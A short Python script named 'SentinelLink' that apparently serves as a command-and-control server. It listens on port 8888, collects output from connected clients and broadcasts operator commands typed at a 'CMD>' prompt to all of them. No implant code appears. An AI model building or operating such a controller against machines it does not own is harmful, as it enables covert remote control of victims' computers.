import socket
import threading
import ctypes

clients = {}  # store connected clients as {addr: socket}


def logo():
    print(r"""
  ____             _   _            _ _     _       _    
 / ___|  ___ _ __ | |_(_)_ __   ___| | |   (_)_ __ | | __
 \___ \ / _ \ '_ \| __| | '_ \ / _ \ | |   | | '_ \| |/ /
  ___) |  __/ | | | |_| | | | |  __/ | |___| | | | |   < 
 |____/ \___|_| |_|\__|_|_| |_|\___|_|_____|_|_| |_|_|\_\
    """)


def handle_client(client_socket, addr):
    clients[addr] = client_socket
    ctypes.windll.kernel32.SetConsoleTitleW(
        f"Connected Clients: {len(clients)}"
    )

    print(f"[+] New client connected: {addr}")

    while True:
        try:
            data = client_socket.recv(4096)
            if not data:
                break

            decoded = data.decode("utf-8", errors="ignore")
            print(f"[{addr}] {decoded}")

        except Exception as e:
            print(f"[!] Error from {addr}: {e}")
            break

    print(f"[-] Client disconnected: {addr}")
    del clients[addr]
    client_socket.close()

    ctypes.windll.kernel32.SetConsoleTitleW(
        f"Connected Clients: {len(clients)}"
    )


def send_commands():
    """Allows server operator to send commands to a selected client."""
    while True:
        if not clients:
            continue

        cmd = input("CMD> ")

        if cmd.strip() == "":
            continue

        # broadcast to all clients for now
        for addr, sock in clients.items():
            try:
                sock.send(cmd.encode())
            except:
                pass


def start_server():
    logo()

    host = "0.0.0.0"
    port = 8888

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)

    print(f"[+] Server started on {host}:{port}")

    threading.Thread(target=send_commands, daemon=True).start()

    while True:
        client_socket, addr = server.accept()
        thread = threading.Thread(
            target=handle_client, args=(client_socket, addr)
        )
        thread.daemon = True
        thread.start()


if __name__ == "__main__":
    start_server()
